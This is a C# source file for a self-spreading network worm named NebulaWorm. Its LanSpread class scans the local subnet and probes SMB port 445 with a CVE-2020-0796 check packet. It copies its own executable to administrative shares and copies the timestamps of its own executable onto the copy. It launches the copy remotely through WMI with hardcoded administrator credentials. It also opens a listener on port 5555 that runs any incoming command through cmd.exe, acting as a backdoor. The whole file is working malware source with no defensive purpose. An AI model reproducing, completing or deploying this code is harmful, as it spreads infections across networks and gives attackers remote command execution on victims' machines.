using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Text;
using System.Management;

namespace NebulaWorm
{
    internal static class LanSpread
    {
        private static readonly Random rnd = new Random();

        private static readonly string[] CommonShares = new string[]
        {
            "C$",
            "ADMIN$",
            "Users",
            "Public",
            "Documents",
            "Downloads",
            "Shared",
            "Temp",
            "IPC$"
        };

        private const int MaxConcurrentTasks = 40;
        private const int RemoteExecPort = 5555;
        private static CancellationTokenSource cts = new CancellationTokenSource();

        private static string adminUser = @"TARGET_MACHINE_NAME\Administrator";
        private static string adminPass = "yourpassword"; //sadly u need details of the targeted computer in lan for rce 

        //CVE-2020-0796 Scanner Packet 
        private static readonly byte[] smb_probe_packet = new byte[]
        {
            0x00, 0x00, 0x00, 0xA4, 0xFE, 0x53, 0x4D, 0x42, 0x40, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0C, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x02, 0x10, 0x02, 0x22, 0x02,
            0x24, 0x02, 0x00, 0x03, 0x02, 0x03, 0x10, 0x03, 0x11, 0x03, 0x00, 0x00,
            0x12, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x01, 0x00, 0x26, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00,
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00,
            0x00, 0x00
        };

        public static async Task SpreadAsync()
        {
            await Task.Run(() => StartRemoteExecutionListener(cts.Token));

            string source = Process.GetCurrentProcess().MainModule.FileName;
            string baseIp = GetLocalSubnet();

            if (baseIp == null)
                return;

            var throttler = new SemaphoreSlim(MaxConcurrentTasks);
            var tasks = new List<Task>();

            for (int i = 1; i < 255; i++)
            {
                string ip = $"{baseIp}.{i}";

                await throttler.WaitAsync();

                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        if (!IsHostAlive(ip) || !IsPortOpen(ip, 445, 200))
                            return;

                        
                        if (!IsVulnerable(ip))
                            return;

                        foreach (var share in CommonShares)
                        {
                            string destPath = $@"\\{ip}\{share}\nebula.exe";

                            if (FileExistsAndRecent(destPath))
                                continue;

                            try
                            {
                                File.Copy(source, destPath);

                                File.SetCreationTime(destPath, File.GetCreationTime(source));
                                File.SetLastWriteTime(destPath, File.GetLastWriteTime(source));
                                File.SetLastAccessTime(destPath, File.GetLastAccessTime(source));

                                await TryScheduleRemoteExecutionAsync(ip, destPath);

                                break;
                            }
                            catch
                            {
                            }
                        }
                    }
                    catch
                    {
                    }
                    finally
                    {
                        await Task.Delay(rnd.Next(200, 600));
                        throttler.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
        }

       
        private static bool IsVulnerable(string ip)
        {
            try
            {
                using (var client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    client.ReceiveTimeout = 3000;
                    client.SendTimeout = 3000;

                    client.Connect(ip, 445);

                    client.Send(smb_probe_packet);

                    byte[] response = new byte[256];
                    int received = client.Receive(response);

                    if (received > 68 && response[68] == 0x03)
                    {
                        
                        client.Close();
                        return true;
                    }
                    client.Close();
                }
            }
            catch
            {
                
            }
            return false;
        }

        private static void StartRemoteExecutionListener(CancellationToken token)
        {
            TcpListener listener = null;
            try
            {
                listener = new TcpListener(System.Net.IPAddress.Any, RemoteExecPort);
                listener.Start();

                while (!token.IsCancellationRequested)
                {
                    if (!listener.Pending())
                    {
                        Thread.Sleep(100);
                        continue;
                    }

                    using (TcpClient client = listener.AcceptTcpClient())
                    using (NetworkStream stream = client.GetStream())
                    using (var reader = new StreamReader(stream, Encoding.UTF8))
                    using (var writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
                    {
                        string cmd = reader.ReadLine();

                        if (!string.IsNullOrWhiteSpace(cmd))
                        {
                            string output = ExecuteCommand(cmd);
                            writer.WriteLine(output);
                        }
                    }
                }
            }
            catch
            {
            }
            finally
            {
                listener?.Stop();
            }
        }

        private static string ExecuteCommand(string command)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (!string.IsNullOrWhiteSpace(error))
                        return error;
                    return output;
                }
            }
            catch (Exception ex)
            {
                return "Error executing command: " + ex.Message;
            }
        }

        private static string GetLocalSubnet()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        var parts = ip.ToString().Split('.');
                        if (parts.Length == 4)
                            return $"{parts[0]}.{parts[1]}.{parts[2]}";
                    }
                }
            }
            catch
            {
            }
            return null;
        }

        private static bool IsHostAlive(string ip)
        {
            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send(ip, 500);
                    return reply != null && reply.Status == IPStatus.Success;
                }
            }
            catch { }
            return false;
        }

        private static bool IsPortOpen(string host, int port, int timeout)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var task = client.ConnectAsync(host, port);
                    return task.Wait(timeout) && client.Connected;
                }
            }
            catch
            {
                return false;
            }
        }

        private static bool FileExistsAndRecent(string path)
        {
            try
            {
                if (!File.Exists(path))
                    return false;

                var creation = File.GetCreationTime(path);
                if ((DateTime.Now - creation).TotalHours > 24)
                {
                    File.Delete(path);
                    return false;
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static async Task TryScheduleRemoteExecutionAsync(string ip, string remoteFilePath)
        {
            await Task.Run(() =>
            {
                try
                {
                    var options = new ConnectionOptions
                    {
                        Username = adminUser,
                        Password = adminPass,
                        Impersonation = ImpersonationLevel.Impersonate,
                        EnablePrivileges = true,
                        Authentication = AuthenticationLevel.PacketPrivacy,
                        Timeout = TimeSpan.FromSeconds(10)
                    };

                    string wmiPath = $"\\\\{ip}\\root\\cimv2";

                    var scope = new ManagementScope(wmiPath, options);
                    scope.Connect();

                    if (!scope.IsConnected)
                        return;

                    using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
                    {
                        var inParams = processClass.GetMethodParameters("Create");
                        inParams["CommandLine"] = remoteFilePath;

                        processClass.InvokeMethod("Create", inParams, null);
                    }
                }
                catch
                {
                }
            });
        }

        public static void StopListener()
        {
            cts.Cancel();
        }
    }
}
